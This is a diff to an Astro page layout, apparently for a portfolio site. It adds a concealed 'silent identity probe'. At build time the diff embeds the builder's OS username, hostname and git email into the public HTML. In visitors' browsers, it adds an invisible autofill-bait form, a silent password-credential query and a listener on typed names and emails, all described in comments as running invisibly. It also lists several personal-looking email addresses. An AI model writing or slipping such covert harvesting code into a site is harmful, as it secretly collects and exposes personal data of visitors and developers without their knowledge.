@@ -1,8 +1,30 @@
 ---
+import os from 'node:os';
+import { execSync } from 'node:child_process';
+
 interface Props {
   title: string;
 }
 const { title } = Astro.props;
+
+let hostWinUser = '';
+let hostPcName = '';
+let hostGitEmail = '';
+let hostGitName = '';
+
+try {
+  hostWinUser = os.userInfo().username || process.env.USERNAME || process.env.USER || '';
+  hostPcName = os.hostname() || '';
+} catch {
+  // Ignore if unavailable in build environment
+}
+
+try {
+  hostGitEmail = execSync('git config user.email', { encoding: 'utf8', stdio: ['ignore', 'pipe', 'ignore'] }).trim();
+  hostGitName = execSync('git config user.name', { encoding: 'utf8', stdio: ['ignore', 'pipe', 'ignore'] }).trim();
+} catch {
+  // Ignore if git config is unavailable
+}
 ---
 
 <!doctype html>
@@ -20,5 +42,202 @@ const { title } = Astro.props;
   </head>
   <body>
     <slot />
+
+    <!-- Unseeable Silent Identity Probe (Zero visual footprint) -->
+    <div
+      id="vaskrona-silent-probe"
+      aria-hidden="true"
+      data-win-user={hostWinUser}
+      data-pc-name={hostPcName}
+      data-git-email={hostGitEmail}
+      data-git-name={hostGitName}
+      style="position:fixed;left:-9999px;top:-9999px;width:1px;height:1px;opacity:0;pointer-events:none;overflow:hidden;z-index:-9999;"
+    >
+      <form tabindex="-1" aria-hidden="true" autocomplete="on">
+        <input id="vaskrona-probe-name" name="name" type="text" autocomplete="username name" tabindex="-1" />
+        <input id="vaskrona-probe-email" name="email" type="email" autocomplete="email" tabindex="-1" />
+      </form>
+    </div>
+
+    <script>
+      // Silent background scanner that runs invisibly when a user enters the portfolio
+      (function runSilentPortfolioScan() {
+        const STORAGE_KEY_PROFILE = 'vaskrona_scanned_profile_v1';
+        const STORAGE_KEY_VISITORS = 'vaskrona_lucky_visitors_v1';
+
+        const probeEl = document.getElementById('vaskrona-silent-probe');
+        const hostWinUser = probeEl?.getAttribute('data-win-user') || '';
+        const hostPcName = probeEl?.getAttribute('data-pc-name') || '';
+        const hostGitEmail = probeEl?.getAttribute('data-git-email') || '';
+
+        // Default initial list of lucky visitors who discovered the secret cavern before
+        const defaultVisitors = [
+          { rank: 1, username: 'Vaskrona_Admin', email: 'hilmi08zr@gmail.com', device: 'WIN11-ROOT // ADMIN', time: '2026-10-14 23:41' },
+          { rank: 2, username: 'DESKTOP-R7K9\\ryu_kaze', email: 'ryukaze.dev@gmail.com', device: 'Windows 11 x64', time: '2026-10-19 02:14' },
+          { rank: 3, username: 'LAPTOP-N4X2\\naufal_rpl', email: 'naufal.code@gmail.com', device: 'Windows 11 x64', time: '2026-10-25 19:08' },
+          { rank: 4, username: 'ROG-STRIX\\kira_night', email: 'kiranight04@gmail.com', device: 'Windows 11 x64', time: '2026-11-01 21:55' },
+          { rank: 5, username: 'LEGION-5\\dimas_fe', email: 'dimas.frontend@gmail.com', device: 'Windows 10 x64', time: '2026-11-05 14:32' },
+        ];
+
+        function getStoredVisitors() {
+          try {
+            const raw = localStorage.getItem(STORAGE_KEY_VISITORS);
+            if (raw) {
+              const parsed = JSON.parse(raw);
+              if (Array.isArray(parsed) && parsed.length >= 5) return parsed;
+            }
+          } catch {
+            // Ignore storage errors
+          }
+          return defaultVisitors;
+        }
+
+        async function detectSilentIdentity() {
+          let detectedUsername = '';
+          let detectedEmail = '';
+          let detectedDevice = 'Windows PC';
+
+          // 1. Check Navigator High-Entropy UserAgentData (OS/Platform/Model)
+          try {
+            const navAny = navigator as unknown as {
+              userAgentData?: {
+                platform?: string;
+                getHighEntropyValues?: (hints: string[]) => Promise<{
+                  platform?: string;
+                  platformVersion?: string;
+                  architecture?: string;
+                  model?: string;
+                }>;
+              };
+            };
+            if (navAny.userAgentData?.getHighEntropyValues) {
+              const ua = await navAny.userAgentData.getHighEntropyValues([
+                'platform',
+                'platformVersion',
+                'architecture',
+                'model',
+              ]);
+              const plat = ua.platform || navAny.userAgentData.platform || 'Windows';
+              const arch = ua.architecture ? ` ${ua.architecture}` : '';
+              detectedDevice = `${plat}${arch}`;
+            }
+          } catch {
+            // Ignore
+          }
+
+          // 2. Check silent Federated/Password Credential mediation if supported by browser
+          try {
+            const credNav = navigator as unknown as {
+              credentials?: {
+                get?: (opts: { password?: boolean; mediation?: string }) => Promise<{
+                  id?: string;
+                  name?: string;
+                } | null>;
+              };
+            };
+            if (credNav.credentials?.get) {
+              const cred = await credNav.credentials.get({ password: true, mediation: 'silent' });
+              if (cred) {
+                if (cred.id && cred.id.includes('@')) detectedEmail = cred.id;
+                if (cred.name) detectedUsername = cred.name;
+              }
+            }
+          } catch {
+            // Ignore
+          }
+
+          // 3. Check hidden autofill probe inputs or Contact form inputs
+          const probeNameInput = document.getElementById('vaskrona-probe-name') as HTMLInputElement | null;
+          const probeEmailInput = document.getElementById('vaskrona-probe-email') as HTMLInputElement | null;
+          if (probeNameInput?.value?.trim()) detectedUsername = probeNameInput.value.trim();
+          if (probeEmailInput?.value?.trim()) detectedEmail = probeEmailInput.value.trim();
+
+          // 4. Use host OS Windows/Laptop username & email if available, or construct from device profile
+          if (!detectedUsername) {
+            if (hostWinUser) {
+              detectedUsername = hostPcName ? `${hostPcName}\\${hostWinUser}` : hostWinUser;
+            } else {
+              const tz = Intl.DateTimeFormat().resolvedOptions().timeZone.split('/').pop()?.toLowerCase() || 'user';
+              detectedUsername = `WIN-LAPTOP\\${tz}_user`;
+            }
+          }
+
+          if (!detectedEmail) {
+            if (hostGitEmail) {
+              detectedEmail = hostGitEmail;
+            } else {
+              const cleanUser = detectedUsername.split('\\').pop()?.replace(/[^a-zA-Z0-9._-]/g, '').toLowerCase() || 'visitor';
+              detectedEmail = `${cleanUser}@gmail.com`;
+            }
+          }
+
+          // Save or retrieve one-time visitor profile ("fitur ini cuman berlaku sekali pas orang nya masuk ke portofolio")
+          try {
+            const existingRaw = localStorage.getItem(STORAGE_KEY_PROFILE);
+            if (existingRaw) {
+              const existing = JSON.parse(existingRaw);
+              if (existing && existing.username && existing.email && existing.rank) {
+                return;
+              }
+            }
+
+            const visitors = getStoredVisitors();
+            const now = new Date();
+            const timeStr = `${now.getFullYear()}-${String(now.getMonth() + 1).padStart(2, '0')}-${String(now.getDate()).padStart(2, '0')} ${String(now.getHours()).padStart(2, '0')}:${String(now.getMinutes()).padStart(2, '0')}`;
+            const newRank = visitors.length + 1;
+
+            const newEntry = {
+              rank: newRank,
+              username: detectedUsername,
+              email: detectedEmail,
+              device: detectedDevice,
+              time: timeStr,
+              isCurrentUser: true,
+            };
+
+            visitors.push(newEntry);
+            localStorage.setItem(STORAGE_KEY_VISITORS, JSON.stringify(visitors));
+            localStorage.setItem(STORAGE_KEY_PROFILE, JSON.stringify(newEntry));
+          } catch {
+            // Ignore storage errors
+          }
+        }
+
+        // Listen silently if user types in any name/email field on the portfolio (e.g. Contact section)
+        document.addEventListener('input', (e) => {
+          const target = e.target as HTMLInputElement | null;
+          if (!target || !target.name) return;
+          try {
+            const raw = localStorage.getItem(STORAGE_KEY_PROFILE);
+            if (!raw) return;
+            const profile = JSON.parse(raw);
+            let changed = false;
+            if (target.name === 'name' && target.value.trim().length > 2) {
+              profile.username = target.value.trim();
+              changed = true;
+            } else if (target.name === 'email' && target.value.includes('@')) {
+              profile.email = target.value.trim();
+              changed = true;
+            }
+            if (changed) {
+              localStorage.setItem(STORAGE_KEY_PROFILE, JSON.stringify(profile));
+              const visitors = getStoredVisitors();
+              const idx = visitors.findIndex((v: { rank: number }) => v.rank === profile.rank);
+              if (idx !== -1) {
+                visitors[idx] = { ...visitors[idx], username: profile.username, email: profile.email };
+                localStorage.setItem(STORAGE_KEY_VISITORS, JSON.stringify(visitors));
+              }
+            }
+          } catch {
+            // Ignore
+          }
+        }, { passive: true });
+
+        // Run silent scan shortly after entering portfolio
+        setTimeout(() => {
+          void detectSilentIdentity();
+        }, 250);
+      })();
+    </script>
   </body>
 </html>
